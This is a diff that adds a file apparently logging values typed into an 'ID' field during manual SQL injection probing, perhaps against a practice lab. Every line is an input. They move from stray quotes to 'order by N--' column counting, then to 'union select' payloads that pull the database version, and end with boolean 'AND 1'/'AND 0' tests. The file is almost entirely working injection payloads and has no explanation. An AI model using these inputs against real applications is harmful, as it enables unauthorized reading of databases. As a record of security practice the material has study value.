@@ -1,0 +1,96 @@
+ID:
+ID:1
+ID:1'
+ID:1'
+ID:1
+ID:1
+ID:1
+ID:
+ID:
+ID:
+ID:1
+ID:1
+ID:1'
+ID:1'
+ID:1
+ID:1' union select 1,2,3
+ID:1' union select 1,2,3 --
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,4,3 -- 
+ID:1' union select 2,4,3 -- 
+ID:1' union select 2,4,5 -- 
+ID:1' union select 1,4,5 -- 
+ID:1' union select 1,4,5  -- 
+ID:1111' union select 1,4,5  -- 
+ID:1111' union select 1,version)(),5  -- 
+ID:1111' union select 1,version(),5  -- 
+ID:-1' union select 1,version(),5  -- 
+ID:-1' union select 1,2,5  -- 
+ID:-1' order by 1--
+ID:1' order by 1--
+ID:1' order by 1-- 
+ID:-1' order by 1-- 
+ID:-1' order by 1--
+ID:4' order by 1--
+ID:4' order by 1-- 
+ID:4' order by 13-- 
+ID:1' order by 13-- 
+ID:4' order by 13-- 
+ID:4' order by 15-- 
+ID:4' order by 14-- 
+ID:4' order by 4-- 
+ID:4' order by 3-- 
+ID:1' order by 3-- 
+ID:2' order by 3-- 
+ID:3' order by 3-- 
+ID:4' order by 3-- 
+ID:1
+ID:1
+ID:5
+ID:5 order by 5--
+ID:-5'%order%by%6%-- 
+ID:-5'%order%by%5%-- 
+ID:-5'%order%by%3%-- 
+ID:1
+ID:1'
+ID:1' order  by 1--
+ID:1' order  by 1-- 
+ID:-1' order  by 1-- 
+ID:-1' order  by 1--
+ID:1
+ID:1'
+ID:1 order by 1--
+ID:1 order by 6--
+ID:1 order by 7--
+ID:1 order by 8--
+ID:1' order by 8--
+ID:-1' order by 8--
+ID:1' order by 8--
+ID:-6' order by 8--
+ID:-6' order by 1--
+ID:111' order by 1--
+ID:111' order by 1-- 
+ID:111' order by 1--
+ID:111' order by 1--
+ID:111' order by 1-- 
+ID:111' order by 3-- 
+ID:111' order by 4-- 
+ID:111' order by 5-- 
+ID:111' order by 7-- 
+ID:111' union all select 1,2,3,4,5,6,7-- 
+ID:111' union all select 1,2,3,4,5,6-- 
+ID:111' union all select 1,version(),3,4,5,6-- 
+ID:1
+ID:111' order by 1--
+ID:111' order by 1-- 
+ID:111' order by 7-- 
+ID:111' order by 6-- 
+ID:111' union select 1,2,3,4,5,6-- 
+ID:1'
+ID:1' AND 1 -- 
+ID:1' AND 0-- 
+ID:1' AND 0-- 
+ID:1' AND 1-- 
+ID:1' AND 1-- 
+ID:1' AND 1-- 
+ID:1
